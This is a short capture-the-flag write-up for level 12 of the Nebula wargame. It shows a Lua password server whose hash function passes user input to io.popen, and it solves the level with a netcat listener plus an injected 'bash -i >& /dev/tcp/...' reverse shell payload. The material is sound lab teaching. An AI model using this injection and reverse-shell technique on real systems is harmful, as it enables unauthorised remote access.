# level 12

```c
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

This level is similar to the level07. We need to run netcat on our machine than
from Nebula we need to call it. The vulnerability is in the hash function,
"io.popen()", it takes the input of the user without parsing it and pass it to
the system.

We need to run on our machine:

```bash
netcat -nvlp 8000
```

Than on Nebula:

``` bash
telnet 127.0.0.1 50001
echo test; bash -i >& /dev/tcp/192.168.242.1/8000 0>&1; echo test
```

Now on your host you should have a shell and you should be logged as flag12,
try to ran getflag, to finish this level.
